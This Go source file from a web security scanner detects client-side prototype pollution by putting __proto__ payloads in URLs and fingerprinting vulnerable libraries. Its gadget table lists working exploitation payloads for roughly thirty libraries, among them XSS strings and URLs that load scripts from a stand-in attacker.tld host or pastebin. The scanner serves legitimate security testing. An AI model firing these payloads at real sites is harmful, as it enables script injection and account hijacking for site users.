package active

import (
	"github.com/pyneda/sukyan/db"
	"github.com/pyneda/sukyan/lib/browser"
	"github.com/pyneda/sukyan/pkg/web"
	"github.com/spf13/viper"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog/log"
)

// This is a port of: https://github.com/kleiton0x00/ppmap

type ClientSidePrototypePollutionAudit struct {
	HistoryItem *db.History
	requests    sync.Map
	WorkspaceID uint
}

func (a *ClientSidePrototypePollutionAudit) Run() {
	if strings.Contains(a.HistoryItem.URL, "?") {
		a.evaluate("&")
	} else {
		a.evaluate("?")
		a.evaluate("#")
	}
}

func (a *ClientSidePrototypePollutionAudit) GetHistory(url string) *db.History {
	history, ok := a.requests.Load(url)
	if ok {
		return history.(*db.History)
	}
	return &db.History{}
}

func (a *ClientSidePrototypePollutionAudit) evaluate(quote string) {
	payloads := [4]string{
		"constructor%5Bprototype%5D%5Bsukyan%5D=reserved",
		"__proto__.sukyan=reserved",
		"constructor.prototype.sukyan=reserved",
		"__proto__%5Bsukyan%5D=reserved",
	}
	b := browser.NewBrowser()
	hijackResultsChannel := make(chan browser.HijackResult)
	browser.Hijack(browser.HijackConfig{AnalyzeJs: false, AnalyzeHTML: false}, b, "Scanner", hijackResultsChannel, a.WorkspaceID)
	defer b.MustClose()
	page := b.MustIncognito().MustPage("")
	web.IgnoreCertificateErrors(page)
	go func() {
		for hijackResult := range hijackResultsChannel {
			a.requests.Store(hijackResult.History.URL, hijackResult.History)
		}
	}()

	for _, payload := range payloads {
		url := string(a.HistoryItem.URL) + string(quote) + string(payload)
		taskLog := log.With().Str("url", url).Str("audit", "client-side-prototype-pollution").Logger()
		navigationTimeout := time.Duration(viper.GetInt("navigation.timeout"))
		navigateError := page.Timeout(navigationTimeout * time.Second).Navigate(url)
		if navigateError != nil {
			taskLog.Warn().Err(navigateError).Msg("Error navigating to page")
			continue
		}
		err := page.Timeout(navigationTimeout * time.Second).WaitLoad()
		if err != nil {
			taskLog.Warn().Err(err).Msg("Error waiting for page complete load")
			// continue
		}
		res := page.MustEval(`() => {
			function getWindowValue() {
				return window.sukyan;
			}
			return getWindowValue();
		}`).Str()
		var sb strings.Builder
		if res == "reserved" {
			taskLog.Debug().Msg("Client side prototype pollution detected, trying to find a known gadget")
		} else {
			continue
		}
		sb.WriteString("The following payload has been inserted " + payload + " and it has been validated that the prototype has been polluted by checking that `window.sukyan` has the value `reflected`\n\n")
		severity := ""
		history := a.GetHistory(url)
		log.Info().Str("url", history.URL).Int("status_code", history.StatusCode).Str("method", history.Method).Msg("History for prototype pollution item")
		fingerprint := page.MustEval(clientSidePrototypePollutionFingerprints).Str()
		if fingerprint == "default" {
			taskLog.Debug().Msg("Could not find a known gadget but prototype pollution detected")
			sb.WriteString("No known gadgets have been found, but you might be able to build your own.")
		} else {
			gadget, ok := GadgetsMap[fingerprint]
			if ok {
				taskLog.Info().Str("fingerprint", fingerprint).Interface("gadget", gadget).Msg("Prototype pollution detected with known gadget")
				severity = "Medium"
				sb.WriteString("Detected a known gadget: " + fingerprint + "\n\n")
				sb.WriteString("The following payloads can be used to exploit this issue:\n")
				for _, p := range gadget.Payloads {
					sb.WriteString(p + "\n")
				}
				if gadget.Info != "" {
					sb.WriteString("\n" + gadget.Info)
				}
			}
		}
		db.CreateIssueFromHistoryAndTemplate(history, db.ClientSidePrototypePollutionCode, sb.String(), 90, severity, &a.WorkspaceID)
		// Issue detected, stop checking
		return
	}

}

type KnownGadget struct {
	Payloads []string
	Info     string
}

var GadgetsMap = map[string]KnownGadget{
	"Adobe Dynamic Tag Management": {
		Payloads: []string{
			"__proto__[src]=data:,alert(1)//",
		},
		Info: "",
	},
	"Akamai Boomerang": {
		Payloads: []string{
			"__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js",
		},
		Info: "",
	},
	"Closure": {
		Payloads: []string{
			"__proto__[*%%20ONERROR]=1&__proto__[*%%20SRC]=1",
			"__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//",
		},
		Info: "",
	},
	"DOMPurify": {
		Payloads: []string{
			"__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src",
			"__proto__[documentMode]=9",
		},
		Info: "",
	},
	"Embedly": {
		Payloads: []string{
			"__proto__[onload]=alert(1)",
		},
		Info: "",
	},
	"jQuery": {
		Payloads: []string{
			"__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x",
			"__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script",
			"__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=",
			"__proto__[src][]=data:,alert(1)//",
			"__proto__[url]=data:,alert(1)//",
			"__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1",
			"__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%%3dalert(1)>",
		},
		Info: "",
	},
	"js-xss": {
		Payloads: []string{
			"__proto__[location]=https://attacker.tld/",
		},
		Info: "",
	},
	"Knockout.js": {
		Payloads: []string{
			"__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=",
		},
		Info: "",
	},
	"Lodash <= 4.17.15": {
		Payloads: []string{
			"__proto__[sourceURL]=%%E2%%80%A8%%E2%%80%%A9alert(1)",
		},
		Info: "",
	},
	"Marionette.js / Backbone.js": {
		Payloads: []string{
			"__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)",
		},
		Info: "",
	},
	"Google reCAPTCHA": {
		Payloads: []string{
			"__proto__[srcdoc][]=<script>alert(1)</script>",
		},
		Info: "",
	},
	"sanitize-html": {
		Payloads: []string{
			"__proto__[*][]=onload",
			"__proto__[innerText]=<script>alert(1)</script>",
		},
		Info: "Displaying all possible payloads",
	},
	"Segment Analytics.js": {
		Payloads: []string{
			"__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1",
		},
		Info: "",
	},
	"Sprint.js": {
		Payloads: []string{
			"__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>",
		},
		Info: "",
	},
	"Swiftype Site Search": {
		Payloads: []string{
			"__proto__[xxx]=alert(1)",
		},
		Info: "",
	},
	"Tealium Universal Tag": {
		Payloads: []string{
			"__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js",
		},
		Info: "",
	},
	"Twitter Universal Website Tag": {
		Payloads: []string{
			"__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)",
		},
		Info: "",
	},
	"Wistia Embedded Video": {
		Payloads: []string{
			"__proto__[innerHTML]=<img/src/onerror=alert(1)>",
		},
		Info: "",
	},
	"Zepto.js": {
		Payloads: []string{
			"__proto__[onerror]=alert(1)",
		},
		Info: "",
	},
	"Vue.js": {
		Payloads: []string{
			"__proto__[v-if]=_c.constructor('alert(1)')()",
			"__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script",
			"__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()",
			"__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>",
			`__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),""`,
			"__proto__[template]=<script>alert(1)</script>",
		},
		Info: "Displaying all possible payloads",
	},
	"Popper.js": {
		Payloads: []string{
			"__proto__[arrow][style]=color:red;transition:all%%201s&__proto__[arrow][ontransitionend]=alert(1)",
			"__proto__[reference][style]=color:red;transition:all%%201s&__proto__[reference][ontransitionend]=alert(2)",
			"__proto__[popper][style]=color:red;transition:all%%201s&__proto__[popper][ontransitionend]=alert(3)",
		},
		Info: "Displaying all possible payloads",
	},
	"Pendo Agent": {
		Payloads: []string{
			"__proto__[dataHost]=attacker.tld/js.js%%23",
		},
		Info: "",
	},
	"i18next": {
		Payloads: []string{
			"__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%%3dalert(1)>",
			"__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%%3dalert(1)>",
			"__proto__[lng]=a&__proto__[key]=<img/src/onerror%%3dalert(1)>",
		},
		Info: "Displaying all possible payloads",
	},
	"Demandbase Tag": {
		Payloads: []string{
			"__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?",
		},
		Info: "",
	},
	"Google Tag Manager plugin for analytics": {
		Payloads: []string{
			"__proto__[customScriptSrc]=//attacker.tld/xss.js",
		},
		Info: "",
	},
	"CanJS deparam": {
		Payloads: []string{
			"__proto__[test]=test",
			"?constructor[prototype][test]=test",
		},
		Info: "Displaying all possible payloads",
	},
	"jQuery parseParams": {
		Payloads: []string{
			"__proto__.test=test",
			"?constructor.prototype.test=test",
		},
		Info: "",
	},
	"MooTools More": {
		Payloads: []string{
			"__proto__[test]=test",
			"?constructor[prototype][test]=test",
		},
		Info: "",
	},
	"Mutiny": {
		Payloads: []string{
			"__proto__.test=test",
		},
		Info: "",
	},
	"AMP": {
		Payloads: []string{
			"__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb",
		},
		Info: "There might be a possible RCE vulnerability.",
	},
}

var clientSidePrototypePollutionFingerprints string = `() => {
	function getGadget() {
		let gadgets = 'default';
		if (typeof _satellite !== 'undefined') {
			gadgets = 'Adobe Dynamic Tag Management';
		} else if (typeof BOOMR !== 'undefined') {
			gadgets = 'Akamai Boomerang';
		} else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
			gadgets = 'Closure';
		} else if (typeof DOMPurify !== 'undefined') {
			gadgets = 'DOMPurify';
		} else if (typeof window.embedly !== 'undefined') {
			gadgets = 'Embedly Cards';
		} else if (typeof filterXSS !== 'undefined') {
			gadgets = 'js-xss';
		} else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
			gadgets = 'Knockout.js';
		} else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
			gadgets = 'Lodash <= 4.17.15';
		} else if (typeof Marionette !== 'undefined') {
			gadgets = 'Marionette.js / Backbone.js';
		} else if (typeof recaptcha !== 'undefined') {
			gadgets = 'Google reCAPTCHA';
		} else if (typeof sanitizeHtml !== 'undefined') {
			gadgets = 'sanitize-html';
		} else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
			gadgets = 'Segment Analytics.js';
		} else if (typeof Sprint !== 'undefined') {
			gadgets = 'Sprint.js';
		} else if (typeof SwiftypeObject != 'undefined') {
			gadgets = 'Swiftype Site Search';
		} else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
			gadgets = 'Tealium Universal Tag';
		} else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
			gadgets = 'Twitter Universal Website Tag';
		} else if (typeof wistiaEmbeds !== 'undefined') {
			gadgets = 'Wistia Embedded Video';
		} else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
			gadgets = 'Zepto.js';
		} else if (typeof Vue != 'undefined') {
			gadgets = "Vue.js";
		} else if (typeof Popper !== 'undefined') {
			gadgets = "Popper.js";
		} else if (typeof pendo !== 'undefined') {
			gadgets = "Pendo Agent";
		} else if (typeof i18next !== 'undefined') {
			gadgets = "i18next";
		} else if (typeof Demandbase != 'undefined') {
			gadgets = "Demandbase Tag";
		} else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
			gadgets = "Google Tag Manager plugin for analytics";
		} else if (typeof can != 'undefined' && typeof can.deparam != 'undefined') {
			gadgets = "CanJS deparam";
		} else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
			gadgets = "jQuery parseParams";
		} else if (typeof String.parseQueryString != 'undefined') {
			gadgets = "MooTools More";
		} else if (typeof mutiny != 'undefined') {
			gadgets = "Mutiny";
		} else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
			gadgets = "AMP";
		} else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
			gadgets = 'jQuery';
		}

	return gadgets;
	}
return getGadget();
}
`
